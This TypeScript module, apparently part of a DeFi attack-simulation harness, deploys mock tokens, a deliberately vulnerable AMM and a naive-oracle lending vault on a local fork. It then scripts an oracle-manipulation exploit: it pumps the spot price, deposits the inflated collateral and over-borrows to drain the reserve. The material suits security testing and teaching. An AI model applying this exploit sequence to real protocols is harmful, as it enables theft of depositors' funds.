import { parseEther, maxUint256 } from "viem";
import type { AttackModule, ModuleResult } from "../types";
import type { ForkRunner } from "../fork";
import { deploy, send, read, toUsd } from "../evm";

const M20 = "MockERC20.sol";
const M20N = "MockERC20";
const AMM = "VulnerableAMM.sol";
const AMMN = "VulnerableAMM";
const V = "NaiveOracleVault.sol";
const VN = "NaiveOracleVault";
const WAD = 10n ** 18n;

export const oracleModule: AttackModule = {
  name: "oracle-manipulation",
  async run(fork: ForkRunner): Promise<ModuleResult> {
    const deployer = fork.wallet(0);
    const atk = fork.wallet(1);
    const d = deployer.account.address;
    const a = atk.account.address;

    const tkn = await deploy(deployer, M20, M20N, ["TKN", "TKN"]);
    const usdc = await deploy(deployer, M20, M20N, ["USDC", "USDC"]);
    const amm = await deploy(deployer, AMM, AMMN, [tkn, usdc]);

    // shallow 100 / 100 pool: cheap to move, which is exactly the weakness
    await send(deployer, tkn, M20, M20N, "mint", [d, parseEther("1000")]);
    await send(deployer, usdc, M20, M20N, "mint", [d, parseEther("1000")]);
    await send(deployer, tkn, M20, M20N, "approve", [amm, maxUint256]);
    await send(deployer, usdc, M20, M20N, "approve", [amm, maxUint256]);
    await send(deployer, amm, AMM, AMMN, "addLiquidity", [parseEther("100"), parseEther("100")]);

    // vault with a deep lending reserve to drain
    const vault = await deploy(deployer, V, VN, [usdc, tkn, amm]);
    await send(deployer, usdc, M20, M20N, "mint", [d, parseEther("100000")]);
    await send(deployer, usdc, M20, M20N, "approve", [vault, maxUint256]);
    await send(deployer, vault, V, VN, "supply", [parseEther("100000")]);

    // attacker capital
    await send(deployer, usdc, M20, M20N, "mint", [a, parseEther("10000")]);
    const before = await read<bigint>(fork, usdc, M20, M20N, "balanceOf", [a]);

    // 1) pump tkn price by buying it
    await send(atk, usdc, M20, M20N, "approve", [amm, maxUint256]);
    await send(atk, amm, AMM, AMMN, "swap", [usdc, parseEther("900"), a]);

    // 2) deposit the tkn just bought, now valued at the inflated spot price
    const tknBal = await read<bigint>(fork, tkn, M20, M20N, "balanceOf", [a]);
    await send(atk, tkn, M20, M20N, "approve", [vault, maxUint256]);
    await send(atk, vault, V, VN, "deposit", [tknBal]);

    // 3) borrow against inflated collateral, just under the ltv cap
    const price = await read<bigint>(fork, vault, V, VN, "price", []);
    const maxDebt = ((tknBal * price) / WAD) * 7000n / 10000n;
    const borrow = (maxDebt * 999n) / 1000n; // buffer against rounding
    await send(atk, vault, V, VN, "borrow", [borrow]);

    const after = await read<bigint>(fork, usdc, M20, M20N, "balanceOf", [a]);
    const profit = after > before ? after - before : 0n;

    return {
      name: "oracle-manipulation",
      success: profit > 0n,
      extractedUsd: toUsd(profit),
      note: "pumped spot price, over-borrowed against inflated collateral, drained the reserve"
    };
  }
};
